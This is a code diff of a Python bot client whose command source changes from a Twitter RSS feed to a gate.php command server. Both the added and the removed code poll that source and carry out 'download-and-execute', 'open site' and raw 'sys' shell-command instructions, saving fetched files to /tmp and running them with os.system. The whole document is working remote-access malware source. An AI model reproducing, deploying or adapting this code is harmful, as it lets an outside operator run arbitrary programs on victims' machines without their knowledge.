@@ -1,61 +1,122 @@
-#Thnx, to twitrss.me service!
-
-import requests
-from time import sleep
 from os import system
-from re import search
+from time import sleep
 from random import randint
+from sys import version_info
 
-twitter_user = ""
-prev_command = ""
-ua_strings = ['Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; he-il; SAMSUNG SM-G900X Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.6 Chrome/28.0.1500.94 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2483.0 Safari/537.36']
+_ver = 0
 
-def retHeaders():
-    header = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'accept-encoding': 'gzip, deflate, br',
-        'dnt': "1",
-        'User-Agent': ua_strings[randint(1, len(ua_strings))],  
-        }
+_scheme = "http://"
+_host = "localhost"
+_gate = "/gate.php"
+
+_sleep = 10
+_save = '/tmp'
+_ext = ['exe', 'run', 'sh', 'php', 'bat']
+
+try:
+    from urllib2 import urlopen
+    _ver = 2
+except:
+    try:
+        if version_info.major == 3:
+            from urllib3 import PoolManager, request
+            _ver = 3
+        else:
+            from urllib.request import urlretrieve as urlopen
+            _ver = 1
+    except:
+        import socket
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((_host, 80))
+        s.send(bytes("GET /false.php HTTP/1.1\nHost: {0}\n\n".format(_host), 'utf8'))
+        s.close()
+
+        exit()
+
+def _ext_check(link):
+    lnk = link.split('.')
+
+    if len(lnk) > 2:
+        lnk = lnk[len(lnk)-1]
+
+        if '/' not in lnk:
+            if lnk in _ext:
+                return '.'+lnk
     
-    return header
+    return ''
 
-def getTask():
-    global prev_command
+def receive(link, need=True):
+    _cmd = ''
 
-    r = requests.get("https://twitrss.me/twitter_user_to_rss/?user="+twitter_user, headers=retHeaders())
+    try:
+        if _ver == 1:
+            r = urlopen(link)
 
-    tmp = r.text.split("\n")
-    tmp = tmp[len(tmp)-12]
-    tmp = tmp.replace("      <title>", "")
-    tmp = tmp.replace("</title>", "")
+            if need:
+                _cmd = r.read().decode('utf-8')
+        elif _ver == 2:
+            r = urlopen(link)
 
-    if tmp != prev_command:
-        prev_command = tmp
-        return tmp
-    else:
-        return ""
+            if need:
+                _cmd = r.read().decode('utf-8')
+        else:
+            c = PoolManager()
+            r = c.request('GET', link, preload_content=False)
 
-def DownloadAndExecute(site, agr):
-    r = requests.get(site, allow_redirects=True)
-    ext = search("([^\/]+)(?=$)", site)
-    open(ext, "wb", r.text)
+            if need:
+                _cmd = r.read(decode_content=True)
 
-    if agr != "":
-        system("./"+ext+" "+agr)
-    else:
-        system("./"+ext)
+            r.release_conn()
+    except:
+        pass
 
-while True:
-    tmp = getTask().split("||")
+    return _cmd
 
-    if tmp[0] == "d&e":
-        DownloadAndExecute(tmp[1], "")
-    elif tmp[0] == "o_s":
-        requests.get(tmp[1], headers=retHeaders(), allow_redirects=True)
-    elif tmp[0] == "de&agr":
-        DownloadAndExecute(tmp[1],tmp[2])
-    elif tmp[0] == "sys":
-        system(tmp[1])
+def dwld_exec(link, agr):
+    try:
+        _tmp = _save + '/my_file-{0}{1}'.format(randint(0,10000), _ext_check(link))
 
-    sleep(60)
+        if _ver == 1:
+            _tmp2 = urlopen(link, _tmp)
+        elif _ver == 2:
+            _tmp2 = urlopen(link)
+            _path = open(_tmp, 'wb').write(_tmp2.read())
+        else:
+            c = PoolManager()
+            r = c.request('GET', link, preload_content=False)
+            
+            with open(_tmp, 'wb') as out:
+                while True:
+                    data = r.read(1000000)
+
+                    if not data:
+                        break
+
+                    out.write(data)
+            
+            r.release_conn()
+
+        system(_tmp2 + ' ' + agr)
+    except:
+        pass
+
+    return ''
+
+if __name__ == "__main__":
+    while True:
+        tmp = receive(_scheme+_host+_gate).split("||")
+
+        if tmp[0] == "d&e":
+            dwld_exec(tmp[1], '')
+        elif tmp[0] == "o_s":
+            receive(tmp[1], False)
+        elif tmp[0] == "de&agr":
+            dwld_exec(tmp[1], tmp[2])
+        elif tmp[0] == "sys":
+            try:
+                system(tmp[1])
+            except:
+                pass
+
+        sleep(_sleep)
